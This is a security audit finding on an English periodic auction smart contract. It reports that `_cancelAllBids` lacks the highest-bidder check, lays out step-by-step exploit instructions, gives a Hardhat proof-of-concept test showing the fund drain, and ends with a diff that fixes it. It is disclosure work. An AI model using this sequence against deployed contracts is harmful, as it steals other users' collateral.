# Bidder can cancel bid and acquire SL for free stealing funds from other users

## Summary
Due to missing checks in the contract's `EnglishPeriodicAuctionInternal.sol` function `_cancelAllBids` a bidder is able to place a highest bid and directly after cancel it and that way acquire the Steward License for free. This will directly steal funds from the previous owner as the winning bid amount is added to previous owner's collateral, but the funds have already been withdrawn by the malicious user. This way the protocol ends up owing users more funds than what is actually present in the contract.

## Vulnerability Detail
The vulnerability is caused by a missing check in the function `_cancelAllBids`, that ensures that a bid which is currently the highest bid cannot be canceled, as we see in the similar function `_cancelBid`
```solidity
function _cancelBid(
  uint256 tokenId,
  uint256 round,
  address bidder
) internal {
  EnglishPeriodicAuctionStorage.Layout
      storage l = EnglishPeriodicAuctionStorage.layout();

  ...

  require( // <----- This check
      bidder != l.highestBids[tokenId][round].bidder,
      'EnglishPeriodicAuction: Cannot cancel bid if highest bidder'
  );

  ...
}
```

The malicious user can do the following to exploit the missing check:
1. Place a winning bid on an auction through `EnglishPeriodicAuctionFacet.placeBid()`
2. In a subsequent transaction (or even the same transaction if the user has set up a malicious contract) call `EnglishPeriodicAuctionFacet.cancelAllBidsAndWithdrawCollateral`
3. The malicious user will now be set as the winning bidder, but at the same time got all of the collateral back, thus the winning bid had 0 cost.
4. If another user places a new winning bid, the malicious user can just repeat step 1-3 to always ensure being the highest bidder until the auction closes.
5. When `EnglishPeriodicAuctionFacet.closeAuction()` is called by any anyone, then the Steward license will be transferred to the malicious user.
6. The bid amount is still added to the previous owners available collateral, but when he/she calls `withdrawCollateral()` 2 things can happen. First scenario is that there are not funds enough in the contract, hence it will revert. Second scenario is that there are funds enough, such that the transaction will not revert. However, the funds will be taken from other users, thus at some point some user(s) will be unable to withdraw their collateral.

Below is a PoC test case that shows the first scenario described in step 6 above - add it to the test file `EnglishPeriodicAuction.ts`:
```javascript
it('should not allow cancel of all bids if highest', async function () {
  // Auction start: Now - 200
  // Auction end: Now + 100
  const instance = await getInstance({
    auctionLengthSeconds: 300,
    initialPeriodStartTime: (await time.latest()) - 200,
    licensePeriod: 1000,
  });
  const licenseMock = await ethers.getContractAt(
    'NativeStewardLicenseMock',
    instance.address,
  );

  const bidAmount1 = ethers.utils.parseEther('1.1');
  const feeAmount1 = await instance.calculateFeeFromBid(bidAmount1);
  const collateralAmount1 = feeAmount1.add(bidAmount1);

  const bidAmount2 = ethers.utils.parseEther('1.2');
  const feeAmount2 = await instance.calculateFeeFromBid(bidAmount2);
  const collateralAmount2 = feeAmount2.add(bidAmount2);

  await instance
    .connect(bidder1)
    .placeBid(0, bidAmount1, { value: collateralAmount1 });

  await instance
    .connect(bidder2)
    .placeBid(0, bidAmount2, { value: collateralAmount2 });

  await time.increase(100);


  // ---- Out-comment this section to make the test pass ----
  const oldBidderBalance = await ethers.provider.getBalance(
    bidder2.address,
  );
  const res = await instance
    .connect(bidder2)
    .cancelAllBidsAndWithdrawCollateral(0);
  const receipt = await res.wait();
  const gasFee = receipt.gasUsed.mul(res.gasPrice);

  const newBidderBalance = await ethers.provider.getBalance(
    bidder2.address,
  );

  // Proof that bidder2 did get all of the collateral back, even though it was in fact the highest bid
  expect(newBidderBalance.add(gasFee).sub(oldBidderBalance)).to.be.equal(
    collateralAmount2,
  );
  // ---- end ----

  await instance.connect(bidder2).closeAuction(0);

  expect(await licenseMock.ownerOf(0)).to.be.equal(bidder2.address); // Proof that bidder2 did indeed win the action

  // Owner does not get the bid amount
  const oldOwnerBalance = await ethers.provider.getBalance(owner.address);
  const res1 = await instance.connect(owner).withdrawCollateral(); // <-- This one will revert unless above section is out-commented
  const receipt1 = await res1.wait();
  const gasFee1 = receipt1.gasUsed.mul(res1.gasPrice);

  const newOwnerBalance = await ethers.provider.getBalance(owner.address);

  // Expect owner balance to increase by bid amount
  expect(newOwnerBalance.add(gasFee1).sub(oldOwnerBalance)).to.be.equal(
    bidAmount2,
  );
});
```

## Impact
Bidder is able to win actions and acquire Steward License for free, thus directly stealing funds from the previous SL owner.

## Tool used

Manual Review

## Recommendation
Add the same check from the function `_cancelBid` to `_cancelAllBids` that checks if a bid is the highest bid and hence cannot be canceled.
```diff
function _cancelAllBids(uint256 tokenId, address bidder) internal {
  EnglishPeriodicAuctionStorage.Layout
      storage l = EnglishPeriodicAuctionStorage.layout();

  uint256 currentAuctionRound = l.currentAuctionRound[tokenId];

  for (uint256 i = 0; i <= currentAuctionRound; i++) {
      Bid storage bid = l.bids[tokenId][i][bidder];

-      if (bid.collateralAmount > 0) {
+      if (bid.collateralAmount > 0 && bidder != l.highestBids[tokenId][i].bidder) {
          // Make collateral available to withdraw
          l.availableCollateral[bidder] += bid.collateralAmount;

          // Reset collateral and bid
          bid.collateralAmount = 0;
          bid.bidAmount = 0;
      }
  }
}
```
